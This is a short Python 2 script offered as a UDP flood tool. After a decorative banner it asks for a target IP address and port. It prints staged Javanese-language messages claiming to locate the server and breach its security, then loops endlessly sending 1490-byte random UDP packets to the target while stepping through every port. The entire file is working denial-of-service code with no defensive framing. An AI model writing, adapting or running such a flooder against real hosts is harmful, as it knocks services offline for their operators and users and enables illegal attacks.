#!/usr/bin/python
# _*_ coding: utf-8 _*_
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
print("""\033[1;31m \033[[92m 
 / ::::   / :::::::  / ::::
/ :: | :: |————| :: / :: | ::
| :: | ::      | :: | :: | ::
| :: | ::      | :: | :: | ::
|  ::::     ::::::  |  ::::
 \_____   |______    \_____

/ :: / ::  /::::::: / :: / ::  /::::::: / :: / ::
| :: ::   | ::————/ | :: | :: | ::————/ | :: | :: 
| :::     | ::::::: | :: | :: | ::::::: | :: | ::
| :: ::     —————:: | :: | ::   —————:: | :: | ::
| :: \ :  | ::::::: |  :::::  | ::::::: |  :::::
|___  \__  \______   \______   \______   \______
__________________________________________________
))                                              (( 
))                                              ((
))______________________________________________((
""")

print(" ")
ip = raw_input("033[94m[*] \033[91mIP 033[91mTarget \033[97m>>> \033[93m ")
port = input("\033[94m[*] \033[91mPort \033[97m>>> \033[93m  ")

os.system("clear")
print("BIRUH BIDDAM NAFDIKA YAA AQSHA")
print ("\033[92m")
print "__________ °° SIYAP-SIYAP GOLEK SERVER °°__________"
time.sleep(5)
print "_____________°° MIWITI GOLEK SAMBUNGAN °°______________"
time.sleep(5)
print "_______________°° NEMBUS LAPISAN KEAMANAN °°_______________"
time.sleep(5)
print "__________________°° DIGAWE SAMBUNGAN °°_____________________"
time.sleep(5)
print "______________°° WESS TAK KEMPLANGI SRIWILL °°_________________"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1